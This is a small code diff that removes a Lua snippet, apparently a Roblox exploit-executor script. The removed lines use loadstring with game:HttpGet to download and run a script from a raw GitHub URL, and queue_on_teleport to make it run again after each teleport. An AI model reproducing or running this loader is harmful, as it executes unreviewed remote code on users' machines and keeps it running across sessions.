@@ -1,7 +1,0 @@
-local Code = [[
-  print("hi")
-  
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/Sepper2023/Scorp.xyz/refs/heads/main/Test"))()
-]]
-
-queue_on_teleport(Code)
